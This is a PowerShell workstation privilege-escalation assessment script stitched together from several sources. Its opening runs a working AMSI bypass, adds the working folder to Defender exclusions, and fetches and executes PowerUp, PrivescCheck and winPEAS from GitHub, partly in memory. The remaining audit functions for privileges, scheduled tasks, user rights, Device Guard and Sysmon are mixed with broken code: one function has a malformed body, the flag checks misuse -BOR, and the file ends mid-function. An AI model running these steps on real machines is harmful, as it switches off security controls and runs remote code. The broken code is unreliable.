Install-Module -Name PoshPrivilege -Force
Import-Module PoshPrivilege

$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path ".\Invoke-WorkstationAssessment.log" -append

Write-Host '#########################' -BackgroundColor Black
Write-Host '## Bypassing AMSI      ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)


#### Add Exclusion (Defender)
Write-Host '####################################################' -BackgroundColor Black
Write-Host '## Add current folder to defender exclusions      ##' -BackgroundColor Black
Write-Host '####################################################' -BackgroundColor Black
Write-Host 'Adding the current folder to the defender exclusion list' -ForegroundColor Black -BackgroundColor White
$currentPath=(Get-Location).Path
Add-MpPreference -ExclusionPath $currentPath

Write-Host '#########################' -BackgroundColor Black
Write-Host '## Running PowerUp      ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Running PowerUp and saving HTML output' -ForegroundColor Black -BackgroundColor White
iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
Invoke-PrivescAudit -ErrorAction SilentlyContinue -HTMLReport

Write-Host '######################################' -BackgroundColor Black
Write-Host '## Running Invoke-PrivescCheck      ##' -BackgroundColor Black
Write-Host '######################################' -BackgroundColor Black
Write-Host 'Running Invoke-PrivescCheck and saving HTML output' -ForegroundColor Black -BackgroundColor White
iex(New-Object Net.WebClient).DownloadString("https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1")
Invoke-PrivescCheck -Report PrivescCheck_$env:computername -Format TXT,CSV,HTML,XML -Extended

Write-Host '######################################' -BackgroundColor Black
Write-Host '## Running WinPeas                  ##' -BackgroundColor Black
Write-Host '######################################' -BackgroundColor Black
Write-Host 'Running WinPeas and saving output' -ForegroundColor Black -BackgroundColor White
# Get latest release
$currentPath=(Get-Location).Path
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
wget $url -OutFile $currentPath/winPEASx64.exe
./winPEASx64.exe log

# One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")


Function Get-BadPrivilege
{

    # Check if Get-Privilege has bee loaded
    $CheckFunc = Test-Path Function:\Get-Privilege
    If(-not $CheckFunc){
        Write-Output "The Get-Privilege function does not appear to be available."
        Write-Output "It can be downloaded from https://github.com/proxb/PoshPrivilege."
        Write-Output "Aborting run."
        break
    }

    # Check if the current user is an administrator
    $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    If(-not $CheckAdmin){
        Write-Output "This script must be run as a local adminsitrator."  
        Write-Output "Aborting run."  
        break
    }

    # Create a table of known high risk rights/privileges
    $BadPrivileges = New-Object System.Collections.Arraylist
    $null = $BadPrivileges.Add("SeImpersonatePrivilege")
    $null = $BadPrivileges.Add("SeAssignPrimaryPrivilege")
    $null = $BadPrivileges.Add("SeTcbPrivilege")
    $null = $BadPrivileges.Add("SeBackupPrivilege")
    $null = $BadPrivileges.Add("SeRestorePrivilege")
    $null = $BadPrivileges.Add("SeCreateTokenPrivilege")
    $null = $BadPrivileges.Add("SeLoadDriverPrivilege")
    $null = $BadPrivileges.Add("SeTakeOwnershipPrivilege")
    $null = $BadPrivileges.Add("SeDebugPrivilege")

    # Iterate through identified right/privilege assignments
    Get-Privilege | 
    ForEach-Object{

        # Get privilege information
        $MyComputerName     = $_.ComputerName
        $MyPrivilege        = $_.Privilege
        $MyDescription      = $_.Description
        $MyAffectedAccounts = $_.Accounts  

        # Check if the privilege is high risk
        $BadPrivileges | 
        ForEach-Object{                                   
            if ($_ -like "$MyPrivilege*")
            {          
                $MyRiskStatus = "Yes"
            }else{
                $MyRiskStatus = "No"
            }
        }

        # Parse affected accounts
        $MyAffectedAccounts | 
        ForEach-Object{

            $myObject = [PSCustomObject]@{
                ComputerName     = [string]$MyComputerName
                Privilege        = [string]$MyPrivilege
                HighRisk         = [string]$MyRiskStatus
                Description      = [string]$MyDescription
                User             = [string]$_           
            }  
        
            $myObject                    
        }        
    }
}

function Get-ScheduledTasks {  
    <#
    .SYNOPSIS
        Get scheduled task information from a system
    
    .DESCRIPTION
        Get scheduled task information from a system

        Uses Schedule.Service COM object, falls back to SchTasks.exe as needed.
        When we fall back to SchTasks, we add empty properties to match the COM object output.

    .PARAMETER ComputerName
        One or more computers to run this against

    .PARAMETER Folder
        Scheduled tasks folder to query.  By default, "\"

    .PARAMETER Recurse
        If specified, recurse through folders below $folder.
        
        Note:  We also recurse if we use SchTasks.exe

    .PARAMETER Path
        If specified, path to export XML files
        
        Details:
            Naming scheme is computername-taskname.xml
            Please note that the base filename is used when importing a scheduled task.  Rename these as needed prior to importing!

    .PARAMETER Exclude
        If specified, exclude tasks matching this regex (we use -notmatch $exclude)

    .PARAMETER CompatibilityMode
        If specified, pull scheduled tasks only with the schtasks.exe command, which works against older systems.
    
        Notes:
            Export is not possible with this switch.
            Recurse is implied with this switch.
    
    .EXAMPLE
    
        #Get scheduled tasks from the root folder of server1 and c-is-ts-91
        Get-ScheduledTasks server1, c-is-ts-91

    .EXAMPLE

        #Get scheduled tasks from all folders on server1, not in a Microsoft folder
        Get-ScheduledTasks server1 -recurse -Exclude "\\Microsoft\\"

    .EXAMPLE
    
        #Get scheduled tasks from all folders on server1, not in a Microsoft folder, and export in XML format (can be used to import scheduled tasks)
        Get-ScheduledTasks server1 -recurse -Exclude "\\Microsoft\\" -path 'D:\Scheduled Tasks'

    .NOTES
    
        Properties returned    : When they will show up
            ComputerName       : All queries
            Name               : All queries
            Path               : COM object queries, added synthetically if we fail back from COM to SchTasks
            Enabled            : COM object queries
            Action             : All queries.  Schtasks.exe queries include both Action and Arguments in this property
            Arguments          : COM object queries
            UserId             : COM object queries
            LastRunTime        : All queries
            NextRunTime        : All queries
            Status             : All queries
            Author             : All queries
            RunLevel           : COM object queries
            Description        : COM object queries
            NumberOfMissedRuns : COM object queries

        Thanks to help from Brian Wilhite, Jaap Brasser, and Jan Egil's functions:
            http://gallery.technet.microsoft.com/scriptcenter/Get-SchedTasks-Determine-5e04513f
            http://gallery.technet.microsoft.com/scriptcenter/Get-Scheduled-tasks-from-3a377294
            http://blog.crayon.no/blogs/janegil/archive/2012/05/28/working_2D00_with_2D00_scheduled_2D00_tasks_2D00_from_2D00_windows_2D00_powershell.aspx

    .FUNCTIONALITY
        Computers

    #>
    [cmdletbinding(
        DefaultParameterSetName='COM'
    )]
    param(
        [parameter(
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true, 
            ValueFromRemainingArguments=$false, 
            Position=0
        )]
        [Alias("host","server","computer")]
        [string[]]$ComputerName = "localhost",

        [parameter()]
        [string]$folder = "\",

        [parameter(ParameterSetName='COM')]
        [switch]$recurse,

        [parameter(ParameterSetName='COM')]
        [validatescript({
            #Test path if provided, otherwise allow $null
            if($_){
                Test-Path -PathType Container -path $_ 
            }
            else {
                $true
            }
        })]
        [string]$Path = $null,

        [parameter()]
        [string]$Exclude = $null,

        [parameter(ParameterSetName='SchTasks')]
        [switch]$CompatibilityMode
    )
    Begin{

        if(-not $CompatibilityMode){
            $sch = New-Object -ComObject Schedule.Service
        
            #thanks to Jaap Brasser - http://gallery.technet.microsoft.com/scriptcenter/Get-Scheduled-tasks-from-3a377294
            function Get-AllTaskSubFolders {
                [cmdletbinding()]
                param (
                    # Set to use $Schedule as default parameter so it automatically list all files
                    # For current schedule object if it exists.
                    $FolderRef = $sch.getfolder("\"),

                    [switch]$recurse
                )

                #No recurse?  Return the folder reference
                if (-not $recurse) {
                    $FolderRef
                }
                #Recurse?  Build up an array!
                else {
                    Try{
                        #This will fail on older systems...
                        $folders = $folderRef.getfolders(1)

                        #Extract results into array
                        $ArrFolders = @(
                            if($folders) {
                                foreach ($fold in $folders) {
                                    $fold
                                    if($fold.getfolders(1)) {
                                        Get-AllTaskSubFolders -FolderRef $fold
                                    }
                                }
                            }
                        )
                    }
                    Catch{
                        #If we failed and the expected error, return folder ref only!
                        if($_.tostring() -like '*Exception calling "GetFolders" with "1" argument(s): "The request is not supported.*')
                        {
                            $folders = $null
                            Write-Warning "GetFolders failed, returning root folder only: $_"
                            Return $FolderRef
                        }
                        else{
                            Throw $_
                        }
                    }

                    #Return only unique results
                        $Results = @($ArrFolders) + @($FolderRef)
                        $UniquePaths = $Results | select -ExpandProperty path -Unique
                        $Results | ?{$UniquePaths -contains $_.path}
                }
            } #Get-AllTaskSubFolders
        }

        function Get-SchTasks {
            [cmdletbinding()]
            param([string]$computername, [string]$folder, [switch]$CompatibilityMode)
            
            #we format the properties to match those returned from com objects
            $result = @( schtasks.exe /query /v /s $computername /fo csv |
                convertfrom-csv |
                ?{$_.taskname -ne "taskname" -and $_.taskname -match $( $folder.replace("\","\\") ) } |
                select @{ label = "ComputerName"; expression = { $computername } },
                    @{ label = "Name"; expression = { $_.TaskName } },
                    @{ label = "Action"; expression = {$_."Task To Run"} },
                    @{ label = "LastRunTime"; expression = {$_."Last Run Time"} },
                    @{ label = "NextRunTime"; expression = {$_."Next Run Time"} },
                    "Status",
                    "Author"
            )

            if($CompatibilityMode){
                #User requested compat mode, don't add props
                $result    
            }
            else{
                #If this was a failback, we don't want to affect display of props for comps that don't fail... include empty props expected for com object
                #We also extract task name and path to parent for the Name and Path props, respectively
                foreach($item in $result){
                    $name = @( $item.Name -split "\\" )[-1]
                    $taskPath = $item.name
                    $item | select ComputerName, @{ label = "Name"; expression = {$name}}, @{ label = "Path"; Expression = {$taskPath}}, Enabled, Action, Arguments, UserId, LastRunTime, NextRunTime, Status, Author, RunLevel, Description, NumberOfMissedRuns
                }
            }
        } #Get-SchTasks
    }    
    Process{
        #loop through computers
        foreach($computer in $computername){
        
            #bool in case com object fails, fall back to schtasks
            $failed = $false
        
            write-verbose "Running against $computer"
            Try {
            
                #use com object unless in compatibility mode.  Set compatibility mode if this fails
                if(-not $compatibilityMode){      

                    Try{
                        #Connect to the computer
                        $sch.Connect($computer)
                        
                        if($recurse)
                        {
                            $AllFolders = Get-AllTaskSubFolders -FolderRef $sch.GetFolder($folder) -recurse -ErrorAction stop
                        }
                        else
                        {
                            $AllFolders = Get-AllTaskSubFolders -FolderRef $sch.GetFolder($folder) -ErrorAction stop
                        }
                        Write-verbose "Looking through $($AllFolders.count) folders on $computer"
                
                        foreach($fold in $AllFolders){
                
                            #Get tasks in this folder
                            $tasks = $fold.GetTasks(0)
                
                            Write-Verbose "Pulling data from $($tasks.count) tasks on $computer in $($fold.name)"
                            foreach($task in $tasks){
                            
                                #extract helpful items from XML
                                $Author = ([regex]::split($task.xml,'<Author>|</Author>'))[1] 
                                $UserId = ([regex]::split($task.xml,'<UserId>|</UserId>'))[1] 
                                $Description =([regex]::split($task.xml,'<Description>|</Description>'))[1]
                                $Action = ([regex]::split($task.xml,'<Command>|</Command>'))[1]
                                $Arguments = ([regex]::split($task.xml,'<Arguments>|</Arguments>'))[1]
                                $RunLevel = ([regex]::split($task.xml,'<RunLevel>|</RunLevel>'))[1]
                                $LogonType = ([regex]::split($task.xml,'<LogonType>|</LogonType>'))[1]
                            
                                #convert state to status
                                Switch ($task.State) { 
                                    0 {$Status = "Unknown"} 
                                    1 {$Status = "Disabled"} 
                                    2 {$Status = "Queued"} 
                                    3 {$Status = "Ready"} 
                                    4 {$Status = "Running"} 
                                }

                                #output the task details
                                if(-not $exclude -or $task.Path -notmatch $Exclude){
                                    $task | select @{ label = "ComputerName"; expression = { $computer } }, 
                                        Name,
                                        Path,
                                        Enabled,
                                        @{ label = "Action"; expression = {$Action} },
                                        @{ label = "Arguments"; expression = {$Arguments} },
                                        @{ label = "UserId"; expression = {$UserId} },
                                        LastRunTime,
                                        NextRunTime,
                                        @{ label = "Status"; expression = {$Status} },
                                        @{ label = "Author"; expression = {$Author} },
                                        @{ label = "RunLevel"; expression = {$RunLevel} },
                                        @{ label = "Description"; expression = {$Description} },
                                        NumberOfMissedRuns
                            
                                    #if specified, output the results in importable XML format
                                    if($path){
                                        $xml = $task.Xml
                                        $taskname = $task.Name
                                        $xml | Out-File $( Join-Path $path "$computer-$taskname.xml" )
                                    }
                                }
                            }
                        }
                    }
                    Catch{
                        Write-Warning "Could not pull scheduled tasks from $computer using COM object, falling back to schtasks.exe"
                        Try{
                            Get-SchTasks -computername $computer -folder $folder -ErrorAction stop
                        }
                        Catch{
                            Write-Error "Could not pull scheduled tasks from $computer using schtasks.exe:`n$_"
                            Continue
                        }
                    }             
                }

                #otherwise, use schtasks
                else{
                
                    Try{
                        Get-SchTasks -computername $computer -folder $folder -CompatibilityMode -ErrorAction stop
                    }
                     Catch{
                        Write-Error "Could not pull scheduled tasks from $computer using schtasks.exe:`n$_"
                        Continue
                     }
                }

            }
            Catch{
                Write-Error "Error pulling Scheduled tasks from $computer`: $_"
                Continue
            }
        }
    }
}
Function Test-RegistryValue {
    param(
        [Alias("PSPath")]
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [String]$Path
        ,
        [Parameter(Position = 1, Mandatory = $true)]
        [String]$Name
        ,
        [Switch]$PassThru
    ) 

    process {
        if (Test-Path $Path) {
            $Key = Get-Item -LiteralPath $Path
            if ($Key.GetValue($Name, $null) -ne $null) {
                if ($PassThru) {
                    Get-ItemProperty $Path $Name
                } else {
                    $true
                }
            } else {
                $false
            }
        } else {
            $false
        }
    }
}

function Get-ProcessInfo() {
<#
.SYNOPSIS

Gets detailed process information via WMI

#>  
    # Extra work here to include process owner and commandline using WMI
    Write-Verbose "Enumerating running processes..."
    $owners = @{}
    $commandline = @{}

    gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
    gwmi win32_process |% {$commandline[$_.handle] = $_.commandline}

    $procs = Get-Process | Sort-Object -property ID
    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "Owner" -Value $owners[$_.id.tostring()] -force}
    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "CommandLine" -Value $commandline[$_.id.tostring()] -force}

    Return $procs
}

function Get-UserRightsAssignment{
    # Fail script if we can't find SecEdit.exe
$SecEdit = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::System)) "SecEdit.exe"
if ( -not (Test-Path $SecEdit) ) {
  Write-Error "File not found - '$SecEdit'" -Category ObjectNotFound
  exit
}

# LookupPrivilegeDisplayName Win32 API doesn't resolve logon right display
# names, so use this hashtable
$UserLogonRights = @{
  "SeBatchLogonRight"                 = "Log on as a batch job"
  "SeDenyBatchLogonRight"             = "Deny log on as a batch job"
  "SeDenyInteractiveLogonRight"       = "Deny log on locally"
  "SeDenyNetworkLogonRight"           = "Deny access to this computer from the network"
  "SeDenyRemoteInteractiveLogonRight" = "Deny log on through Remote Desktop Services"
  "SeDenyServiceLogonRight"           = "Deny log on as a service"
  "SeInteractiveLogonRight"           = "Allow log on locally"
  "SeNetworkLogonRight"               = "Access this computer from the network"
  "SeRemoteInteractiveLogonRight"     = "Allow log on through Remote Desktop Services"
  "SeServiceLogonRight"               = "Log on as a service"
}

# Create type to invoke LookupPrivilegeDisplayName Win32 API
$Win32APISignature = @'
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool LookupPrivilegeDisplayName(
  string systemName,
  string privilegeName,
  System.Text.StringBuilder displayName,
  ref uint cbDisplayName,
  out uint languageId
);
'@

try{
    $AdvApi32 = Add-Type advapi32 $Win32APISignature -Namespace LookupPrivilegeDisplayName -PassThru    
}
catch{
    "ERROR"
}


# Use LookupPrivilegeDisplayName Win32 API to get display name of privilege
# (except for user logon rights)
function Get-PrivilegeDisplayName {
  param(
    [String] $name
  )
  $displayNameSB = New-Object System.Text.StringBuilder 1024
  $languageId = 0
  $ok = $AdvApi32::LookupPrivilegeDisplayName($null, $name, $displayNameSB, [Ref] $displayNameSB.Capacity, [Ref] $languageId)
  if ( $ok ) {
    $displayNameSB.ToString()
  }
  else {
    # Doesn't lookup logon rights, so use hashtable for that
    if ( $UserLogonRights[$name] ) {
      $UserLogonRights[$name]
    }
    else {
      $name
    }
  }
}

# Outputs list of hashtables as a PSObject
function Out-Object {
  param(
    [System.Collections.Hashtable[]] $hashData
  )
  $order = @()
  $result = @{}
  $hashData | ForEach-Object {
    $order += ($_.Keys -as [Array])[0]
    $result += $_
  }
  New-Object PSObject -Property $result | Select-Object $order
}

function Add-SecurityCheckItem {
<#
.SYNOPSIS
Creates a new security check item and adds it to a global array.
Author: Michael Ritter
License: BSD 3-Clause
.DESCRIPTION
Single Security Checks that cannot be exported as CSV need to be collected centrally
.PARAMETER SecurityItem
Specifies the desired name for the security item group. (i.e. Microsoft PowerShell)
.PARAMETER SecurityItemCheck
Specifies the desired name for the specific check
.PARAMETER AuditCheckResult
Specifies the result of the check
.PARAMETER AuditCheckPass
Specifies if the security check was successful or not
.EXAMPLE
$result = "PowerShell v$($($PSVersionTable.PSVersion).Major) is installed and starts by default, important security features are shipped with this version" 
Add-SecurityCheckItem -SecurityItem "PowerShell Version" -Check "Check if at least PowerShell version 5 is in use" -AuditCheckResult $result -AuditCheckPass $true

#>
    param (
        [String] $strSecurityItem
    )
    SecurityItem    = $SecurityItem
    Check     = $strSecurityItemCheck                
    Result      = $strAuditCheckResult
    Passed = $booAuditCheckPass
}
# Translates a SID in the form *S-1-5-... to its account name;
function Get-AccountName {
  param(
    [String] $principal
  )
  if ( $principal[0] -eq "*" ) {
    $sid = New-Object System.Security.Principal.SecurityIdentifier($principal.Substring(1))
    $sid.Translate([Security.Principal.NTAccount])
  }
  else {
    $principal
  }
}

$TemplateFilename = Join-Path ([IO.Path]::GetTempPath()) ([IO.Path]::GetRandomFileName())
$LogFilename = Join-Path ([IO.Path]::GetTempPath()) ([IO.Path]::GetRandomFileName())
$StdOut = & $SecEdit /export /cfg $TemplateFilename /areas USER_RIGHTS /log $LogFilename
if ( $LASTEXITCODE -eq 0 ) {
  Select-String '^(Se\S+) = (\S+)' $TemplateFilename | Foreach-Object {
    $Privilege = $_.Matches[0].Groups[1].Value
    $Principals = $_.Matches[0].Groups[2].Value -split ','
    foreach ( $Principal in $Principals ) {
      Out-Object `
        @{"Privilege" = $Privilege},
        @{"PrivilegeName" = Get-PrivilegeDisplayName $Privilege},
        @{"Principal" = Get-AccountName $Principal}
    }
  }
}
else {
  $OFS = ""
  Write-Error "$StdOut"
}
Remove-Item $TemplateFilename,$LogFilename -ErrorAction SilentlyContinue
}

function Get-ExplicitLogonEvents {
<#
    .SYNOPSIS

    Gets 4648 Explicit Logon Events from Windows Event Log

    Author: Lee Christensen (@tifkin_)
#>

    [CmdletBinding()]
    Param(
        [int]
        $Days = 10
    )

    Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4648; StartTime=(Get-Date).AddDays(-$Days)} | ?{!$_.Properties[5].Value.EndsWith('$')} | %{

        $Properties = $_.Properties
        New-Object PSObject -Property @{
            TimeCreated       = $_.TimeCreated
            #SubjectUserSid    = $Properties[0].Value.ToString()
            SubjectUserName   = $Properties[1].Value
            SubjectDomainName = $Properties[2].Value
            #SubjectLogonId    = $Properties[3].Value
            #LogonGuid         = $Properties[4].Value.ToString()
            TargetUserName    = $Properties[5].Value
            TargetDomainName  = $Properties[6].Value
            #TargetLogonGuid   = $Properties[7].Value
            #TargetServerName  = $Properties[8].Value
            #TargetInfo        = $Properties[9].Value
            #ProcessId         = $Properties[10].Value
            ProcessName       = $Properties[11].Value
            IpAddress         = $Properties[12].Value
            #IpPort            = $Properties[13].Value
        }
    }
}

Function Convert-UserFlag  {

  Param ($UserFlag)

  $List = New-Object System.Collections.ArrayList

  Switch  ($UserFlag) {

	  ($UserFlag  -BOR 0x0001)  {[void]$List.Add('SCRIPT')}

	  ($UserFlag  -BOR 0x0002)  {[void]$List.Add('ACCOUNTDISABLE')}

	  ($UserFlag  -BOR 0x0008)  {[void]$List.Add('HOMEDIR_REQUIRED')}

	  ($UserFlag  -BOR 0x0010)  {[void]$List.Add('LOCKOUT')}

	  ($UserFlag  -BOR 0x0020)  {[void]$List.Add('PASSWD_NOTREQD')}

	  ($UserFlag  -BOR 0x0040)  {[void]$List.Add('PASSWD_CANT_CHANGE')}

	  ($UserFlag  -BOR 0x0080)  {[void]$List.Add('ENCRYPTED_TEXT_PWD_ALLOWED')}

	  ($UserFlag  -BOR 0x0100)  {[void]$List.Add('TEMP_DUPLICATE_ACCOUNT')}

	  ($UserFlag  -BOR 0x0200)  {[void]$List.Add('NORMAL_ACCOUNT')}

	  ($UserFlag  -BOR 0x0800)  {[void]$List.Add('INTERDOMAIN_TRUST_ACCOUNT')}

	  ($UserFlag  -BOR 0x1000)  {[void]$List.Add('WORKSTATION_TRUST_ACCOUNT')}

	  ($UserFlag  -BOR 0x2000)  {[void]$List.Add('SERVER_TRUST_ACCOUNT')}

	  ($UserFlag  -BOR 0x10000)  {[void]$List.Add('DONT_EXPIRE_PASSWORD')}

	  ($UserFlag  -BOR 0x20000)  {[void]$List.Add('MNS_LOGON_ACCOUNT')}

	  ($UserFlag  -BOR 0x40000)  {[void]$List.Add('SMARTCARD_REQUIRED')}

	  ($UserFlag  -BOR 0x80000)  {[void]$List.Add('TRUSTED_FOR_DELEGATION')}

	  ($UserFlag  -BOR 0x100000)  {[void]$List.Add('NOT_DELEGATED')}

	  ($UserFlag  -BOR 0x200000)  {[void]$List.Add('USE_DES_KEY_ONLY')}

	  ($UserFlag  -BOR 0x400000)  {[void]$List.Add('DONT_REQ_PREAUTH')}

	  ($UserFlag  -BOR 0x800000)  {[void]$List.Add('PASSWORD_EXPIRED')}

	  ($UserFlag  -BOR 0x1000000)  {[void]$List.Add('TRUSTED_TO_AUTH_FOR_DELEGATION')}

	  ($UserFlag  -BOR 0x04000000)  {[void]$List.Add('PARTIAL_SECRETS_ACCOUNT')}

  }

  $List -join ', '

} 

function Get-CSDeviceGuardStatus {
<#
.SYNOPSIS
Obtains Device Guard configuration status information
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
.DESCRIPTION
Get-CSDeviceGuardStatus obtains information about available and configured Device Guard settings. This function will only work on systems where Device Guard is available - starting with Windows 10 Enterprise and Server 2016. It relies upon the ROOT\Microsoft\Windows\DeviceGuard:Win32_DeviceGuard WMI class. While returning an instance of a Win32_DeviceGuard class would suffice, it returns numeric values for settings that are not human-readable.
.PARAMETER CimSession
Specifies the CIM session to use for this cmdlet. Enter a variable that contains the CIM session or a command that creates or gets the CIM session, such as the New-CimSession or Get-CimSession cmdlets. For more information, see about_CimSessions.
.EXAMPLE
Get-CSDeviceGuardStatus
Lists the available and configured Device Guard settings.
.OUTPUTS
CimSweep.DeviceGuardStatus
Outputs objects representing available and configured Device Guard settings.
#>

    [CmdletBinding()]
    [OutputType('CimSweep.DeviceGuardStatus')]
    param(
        [Alias('Session')]
        [ValidateNotNullOrEmpty()]
        [Microsoft.Management.Infrastructure.CimSession[]]
        $CimSession
    )

    BEGIN {
        # If a CIM session is not provided, trick the function into thinking there is one.
        if (-not $PSBoundParameters['CimSession']) {
            $CimSession = ''
            $CIMSessionCount = 1
        } else {
            $CIMSessionCount = $CimSession.Count
        }

        $CurrentCIMSession = 0

        # Also applies to RequiredSecurityProperties
        $AvailableSecurityPropertiesTable = @{
            1 = 'BaseVirtualizationSupport'
            2 = 'SecureBoot'
            3 = 'DMAProtection'
            4 = 'SecureMemoryOverwrite'
            5 = 'UEFICodeReadOnly'
            6 = 'SMMSecurityMitigations1.0'
        }

        # Also applies to UsermodeCodeIntegrityPolicyEnforcementStatus
        $CodeIntegrityPolicyEnforcementStatusTable = @{
            0 = 'Off'
            1 = 'AuditMode'
            2 = 'EnforcementMode'
        }

        # Also applies to SecurityServicesRunning
        $SecurityServicesConfiguredTable = @{
            1 = 'CredentialGuard'
            2 = 'HypervisorEnforcedCodeIntegrity'
        }

        $VirtualizationBasedSecurityStatusTable = @{
            0 = 'Off'
            1 = 'Configured'
            2 = 'Running'
        }
    }

    PROCESS {
        foreach ($Session in $CimSession) {
            $ComputerName = $Session.ComputerName
            if (-not $Session.ComputerName) { $ComputerName = 'localhost' }

            # Display a progress activity for each CIM session
            Write-Progress -Id 1 -Activity 'CimSweep - Device Guard configuration sweep' -Status "($($CurrentCIMSession+1)/$($CIMSessionCount)) Current computer: $ComputerName" -PercentComplete (($CurrentCIMSession / $CIMSessionCount) * 100)
            $CurrentCIMSession++

            $CommonArgs = @{}

            if ($Session.Id) { $CommonArgs['CimSession'] = $Session }
            
            $DeviceGuardStatus = Get-CimInstance -Namespace ROOT\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard @CommonArgs

            # An object will not be returned if the namespace/class do not exist
            # e.g. <= Win8 and Server 2012
            if ($DeviceGuardStatus) {
                # Map numeric settings values to human readable strings.

                # All of these properties are UInt32 values.
                # The currently defined values are safe to cast to Int32
                $AvailableSecurityProperties = $DeviceGuardStatus.AvailableSecurityProperties |
                    ForEach-Object { $AvailableSecurityPropertiesTable[[Int32] $_] }

                $CodeIntegrityPolicyEnforcementStatus = $CodeIntegrityPolicyEnforcementStatusTable[[Int32] $DeviceGuardStatus.CodeIntegrityPolicyEnforcementStatus]

                $RequiredSecurityProperties = $DeviceGuardStatus.RequiredSecurityProperties |
                    ForEach-Object { $AvailableSecurityPropertiesTable[[Int32] $_] }

                $SecurityServicesConfigured = $DeviceGuardStatus.SecurityServicesConfigured |
                    ForEach-Object { $SecurityServicesConfiguredTable[[Int32] $_] }

                $SecurityServicesRunning = $DeviceGuardStatus.SecurityServicesRunning |
                    ForEach-Object { $SecurityServicesConfiguredTable[[Int32] $_] }

                $UsermodeCodeIntegrityPolicyEnforcementStatus = $CodeIntegrityPolicyEnforcementStatusTable[[Int32] $DeviceGuardStatus.UsermodeCodeIntegrityPolicyEnforcementStatus]

                $VirtualizationBasedSecurityStatus = $VirtualizationBasedSecurityStatusTable[[Int32] $DeviceGuardStatus.VirtualizationBasedSecurityStatus]
            
                $ObjectProperties = [Ordered] @{
                    PSTypeName = 'CimSweep.DeviceGuardStatus'
                    AvailableSecurityProperties = $AvailableSecurityProperties
                    CodeIntegrityPolicyEnforcementStatus = $CodeIntegrityPolicyEnforcementStatus
                    InstanceIdentifier = $DeviceGuardStatus.InstanceIdentifier
                    RequiredSecurityProperties = $RequiredSecurityProperties
                    SecurityServicesConfigured = $SecurityServicesConfigured
                    SecurityServicesRunning = $SecurityServicesRunning
                    UsermodeCodeIntegrityPolicyEnforcementStatus = $UsermodeCodeIntegrityPolicyEnforcementStatus
                    Version = $DeviceGuardStatus.Version
                    VirtualizationBasedSecurityStatus = $VirtualizationBasedSecurityStatus
                }

                if ($DeviceGuardStatus.PSComputerName) {
                    $ObjectProperties['PSComputerName'] = $DeviceGuardStatus.PSComputerName
                }

                [PSCustomObject] $ObjectProperties
            }
        }
    }
}

function Test-SysmonInstalled {
    # Find the Sysmon driver based solely off the presence of the "Rules" value.
    # This is being done because the user can optionally specify a driver name other than the default: SysmonDrv
    $ServiceParameters = Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\Services -Recurse -Include 'Parameters' -ErrorAction SilentlyContinue
    $DriverParameters = $ServiceParameters | Where-Object { $_.Property -contains 'Rules' }

    if (-not $DriverParameters) {
        Write-Host 'Unable to locate a Sysmon driver. Either it is not installed or you do not have permissions to read the driver configuration in the registry.' -ForegroundColor Red
        return
    }

    $FoundSysmonMatch = $False
    $SysmonDriverName = $null
    $SysmonServiceName = $null
    $SysmonDriverParams = $null

    # Just in case there is more than one instance where there is a "Rules" value, correlate it with the user-mode service to confirm.
    $DriverParameters | ForEach-Object {
        $CandidateDriverName = $_.PSParentPath.Split('\')[-1]
        $CandidateDriverParams = $_

        $CandidateUserModeServices = $ServiceParameters | Where-Object { $_.Property -contains 'DriverName' }

        $CandidateUserModeServices | ForEach-Object {
            $CandidateServiceName = $_.PSParentPath.Split('\')[-1]
            $DriverName = ($_ | Get-ItemProperty).DriverName

            # We have a matching user-mode Sysmon service and Sysmon driver.
            if ($DriverName -eq $CandidateDriverName) {
                $FoundSysmonMatch = $True
                $SysmonDriverName = $CandidateDriverName
                $SysmonServiceName = $CandidateServiceName
                $SysmonDriverParams = $CandidateDriverParams | Get-ItemProperty
            }
        }
    }

    [PSCustomObject] @{
        SysmonInstalled = $FoundSysmonMatch
        ServiceName = $SysmonServiceName
        DriverName = $SysmonDriverName
    }
}

Function Add-ResultEntry {

    <#
    .SYNOPSIS
        The result of the test is saved in a CSV file with the retrieved
        value, the severity level and the recommended value.
    #>

    [CmdletBinding()]
    Param (
        
        [String]
        $Text
    )

    try {
        Add-Content -Path $ReportFile -Value $Text -ErrorAction Stop
    } catch {
        Write-ProtocolEntry -Text "Error while writing the result into $ReportFile. Aborting..." -LogLevel "Error"
        Break            
    }
}

function Get-SecurityAuditPolicyDE
{
    [CmdletBinding()]
    param ()

    # Use the helper functions to execute the auditpol.exe queries.
    $csvAuditCategories = Invoke-AuditPolListSubcategoryAllCsv | ConvertFrom-Csv
    $csvAuditSettings   = Invoke-AuditPolGetCategoryAllCsv | ConvertFrom-Csv

    foreach ($csvAuditCategory in $csvAuditCategories)
    {
